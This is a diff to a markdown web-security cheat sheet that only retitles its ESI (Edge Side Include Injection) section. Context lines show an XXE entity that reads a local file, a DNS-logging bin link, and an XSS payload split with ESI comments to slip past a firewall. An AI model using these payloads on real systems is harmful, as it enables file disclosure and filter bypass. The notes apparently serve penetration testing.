@@ -7,7 +7,7 @@
 - [Ubuntu](#ubuntu)
 - [Web Applications Security](#web-applications-security)
    + [XXE](#xxe)
-   + [ESI](#esi-(edge-side-include-injection))
+   + [ESI](#esi)
 
 ## Burp Suite Professional
 ### Running own collaborator:  
@@ -47,7 +47,8 @@ Injection:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
 ```  
 http://dnsbin.zhack.ca/  
-### ESI (Edge Side Include Injection)
+### ESI 
+Edge Side Include Injection
 WAF'alike bypass:
 ```html
 <svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
